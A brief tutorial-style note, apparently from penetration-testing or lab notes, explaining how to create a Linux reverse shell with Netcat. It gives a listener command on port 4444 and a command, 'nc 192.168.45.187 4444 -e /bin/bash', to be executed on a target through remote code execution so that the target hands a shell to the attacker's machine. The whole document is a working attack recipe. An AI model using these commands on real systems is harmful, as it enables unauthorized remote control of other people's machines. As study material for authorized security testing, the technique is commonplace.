# Overview
Create a reverse shell on a Linux target using NetCat on both the target and local machine.  This technique requires two terminals, each with NetCat session providing two different functions.
## Terminal 1
~~~ bash
# create a netcat listener
nc -nvlp 4444

# this is a netcat listiner listeniung for a connection on the local machine on port 4444
~~~
## Terminal 2
~~~ bash
# this exploit requires that netcat is available on the target machine and the local machine has Remote Code Executation (RCE) on the target machine

# the 'which' command can be used to check if an application is available
which netcat
/usr/bin/netcat

# with netcat avalable and a listener running on the local machine, a reverse shell can be created on the target machine using RCE to execute the following command

# in this example the ip of the local machine is 192.168.45.187
#### NOTE this may require url encoding for whitespace and special characters
nc 192.168.45.187 4444 -e /bin/bash
